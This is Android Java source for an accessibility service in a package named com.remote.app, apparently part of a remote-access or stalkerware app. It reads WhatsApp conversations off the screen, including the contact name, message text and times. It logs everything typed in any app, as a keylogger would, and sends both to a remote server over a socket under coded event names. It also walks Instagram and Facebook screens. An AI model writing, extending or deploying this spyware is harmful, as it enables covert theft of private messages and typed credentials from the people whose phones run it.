package com.remote.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.remote.app.socket.IOSocket;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;


public class CustomAccessibilityService extends AccessibilityService {

    private long mDebugDepth;
    private String whatsAppConversationDate;
    private CharSequence lastWhatsAppDate;


    private void getWhatsAppMessages(AccessibilityNodeInfoCompat rootInActiveWindow, AccessibilityEvent event) {
        //rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/toolbar").get(0).mInfo.getParent().getChild(1).getChild(3)
        List<AccessibilityNodeInfoCompat> nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_layout");
        if (nodeInfoByViewId == null || nodeInfoByViewId.size() <= 0)
            return;

        AccessibilityNodeInfoCompat nodeInfo = nodeInfoByViewId.get(0);
        if (nodeInfo.getChildCount() >= 4) {
            AccessibilityNodeInfoCompat listNode = nodeInfo.getChild(3);
            if (!listNode.getViewIdResourceName().equals("android:id/list")) {
                return;
            }
            //is a chat!
            CharSequence contactName = null;
            nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");
            if (nodeInfoByViewId.size() > 0) {
                contactName = nodeInfoByViewId.get(0).getText();
            }

            Boolean invalidateBeforeDate = false;
            JSONArray messages = new JSONArray();
            for (int i = 0; i < listNode.getChildCount(); i++) {
                try {
                    AccessibilityNodeInfoCompat chatNode = listNode.getChild(i);
                    if (chatNode == null || chatNode.getChildCount() <= 0)
                        continue;

                    AccessibilityNodeInfoCompat firstNodeChild = chatNode.getChild(0);
                    if (firstNodeChild != null) {


                        if (firstNodeChild.getViewIdResourceName() != null) {
                            if (firstNodeChild.getViewIdResourceName().equals("com.whatsapp:id/conversation_row_root")) {
                                //maybe an audio, treat it later.
                                continue;
                            }

                            if (firstNodeChild.getViewIdResourceName().equals("com.whatsapp:id/conversation_row_date_divider")) {
                                whatsAppConversationDate = firstNodeChild.getText().toString();
                                lastWhatsAppDate = null;

                                if (messages.length() > 0) {
                                    for (int ji = 0; ji < messages.length(); ji++) {
                                        JSONObject msg = messages.getJSONObject(ji);
                                        if (msg.getString("date").equals(whatsAppConversationDate)) {
                                            messages.remove(ji);
                                        }
                                    }
                                }

                                if (chatNode.getChild(1).getViewIdResourceName().equals("com.whatsapp:id/info"))
                                    continue;

                                CharSequence message = chatNode.getChild(1).getChild(0).getChild(0).getText();
                                AccessibilityNodeInfoCompat msgData = chatNode.getChild(1).getChild(0).getChild(1);
                                CharSequence time = msgData.getChild(0).getText();
                                boolean isSent = msgData.getChildCount() > 1;

                                Log.i(isSent ? event.getEventType() + " - Mensagem Enviada " : "Mensagem Recebida", whatsAppConversationDate + " - " + time + " - " + message);

                                JSONObject jsonMessage = new JSONObject();
                                jsonMessage.put("message", message);
                                jsonMessage.put("date", whatsAppConversationDate);
                                jsonMessage.put("time", time);
                                jsonMessage.put("isOwn", isSent);
                                messages.put(jsonMessage);
                            } else if (firstNodeChild.getViewIdResourceName().equals("com.whatsapp:id/main_layout")) {
                                if (firstNodeChild.getChildCount() <= 0)
                                    continue;

                                AccessibilityNodeInfoCompat firstSubNodeChild = firstNodeChild.getChild(0);
                                if (firstSubNodeChild == null || firstSubNodeChild.getChildCount() <= 0)
                                    continue;

                                CharSequence message = firstSubNodeChild.getChild(0).getText();
                                AccessibilityNodeInfoCompat msgData = chatNode.getChild(0).getChild(0).getChild(1);
                                CharSequence time = msgData.getChild(0).getText();
                                boolean isSent = msgData.getChildCount() > 1;
                                CharSequence date = whatsAppConversationDate == null ? lastWhatsAppDate : whatsAppConversationDate;

                                JSONObject jsonMessage = new JSONObject();
                                jsonMessage.put("message", message);
                                jsonMessage.put("date", date);
                                jsonMessage.put("time", time);
                                jsonMessage.put("isOwn", isSent);
                                messages.put(jsonMessage);

                                Log.i(isSent ? event.getEventType() + " - Mensagem Enviada " : "Mensagem Recebida", date + " - " + time + " - " + message);
                                //todo send to backend!
                            }
                        } else if (firstNodeChild.getChildCount() > 1) {
                            if (firstNodeChild.getChild(0).getViewIdResourceName().equals("com.whatsapp:id/sticker_bubble_header")) {
                                Log.i("Sticker!", "sticker!");
                            }
                        }
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
            IOSocket.getInstance().send("_0xAM", messages.toString(), contactName, "WhatsApp");
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            final int eventType = event.getEventType();
            AccessibilityNodeInfo source = event.getSource();

            mDebugDepth = 0;

            if (source == null || source.getPackageName() == null)
                return;

            String packageName = source.getPackageName().toString();

            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED: {
                    if (packageName.startsWith("com.whatsapp")) {
                        if (source.getViewIdResourceName() != null && source.getViewIdResourceName().equals("com.whatsapp:id/contact_row_container")) {
                            if (source.getChildCount() > 2) {
                                lastWhatsAppDate = source.getChild(2).getChild(0).getChild(1).getText();
                            } else if (source.getChildCount() > 1) {
                                lastWhatsAppDate = source.getChild(1).getChild(0).getChild(1).getText();
                            } else {
                                lastWhatsAppDate = source.getChild(0).getChild(0).getChild(1).getText();
                            }
                        }
                    }
                    break;
                }
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    if (packageName.startsWith("com.whatsapp")) {
                        AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());
                        getWhatsAppMessages(rootInActiveWindow, event);
                        printAllViews(source);

                    } else if (packageName.startsWith("com.instagram"))
                        printAllViews(source);
                    else if (packageName.startsWith("com.facebook"))
                        printAllViews(source);
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    String msg = event.getText().toString();
                    String eventText = msg.substring(1, msg.length() - 1);
                    //System.out.println("ACCESSIBILITY SERVICE : " + eventText);

                    //todo check
                    PackageManager pm = getApplicationContext().getPackageManager();
                    ApplicationInfo appInfo = null;
                    try {
                        appInfo = pm.getApplicationInfo(packageName, 0);
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                    }

                    IOSocket.getInstance().send("_0xKL", eventText, appInfo == null ? packageName : pm.getApplicationLabel(appInfo));
                    break;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void printAllViews(AccessibilityNodeInfo mNodeInfo) {
        if (mNodeInfo == null) return;
        String log = "";
        for (int i = 0; i < mDebugDepth; i++) {
            log += ".";
        }

        if (mNodeInfo.getText() != null) {
            AccessibilityNodeInfo parent = mNodeInfo.getParent();
            //username -> mNodeInfo.getViewIdResourceName().equals("com.instagram.android:id/other_user_full_name_or_username"
            if (mNodeInfo.getViewIdResourceName() != null &&
                    mNodeInfo.getViewIdResourceName().equals("com.instagram.android:id/direct_text_message_text_view")) {
                AccessibilityNodeInfo parent1 = parent.getParent();
                AccessibilityNodeInfo parent2 = parent1.getParent();
                AccessibilityNodeInfo parent3 = parent2.getParent();
                // parent3.getChild(1) pega horário caso outra pessoa tenha enviado
                AccessibilityNodeInfo parent4 = parent3.getParent();
                Log.d("PARENT MSG", parent.toString());
            }

            log += "(" + mNodeInfo.getText() + " <-- " +
                    mNodeInfo.getViewIdResourceName() + ")";

            Log.d("NO TAG", log);
        }

        if (mNodeInfo.getChildCount() < 1) return;
        mDebugDepth++;

        for (int i = 0; i < mNodeInfo.getChildCount(); i++) {
            printAllViews(mNodeInfo.getChild(i));
        }
        mDebugDepth--;
    }

    @Override
    public void onInterrupt() {
        Log.d("acess", "stopd");
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info = getServiceInfo();
        this.setServiceInfo(info);
    }

}
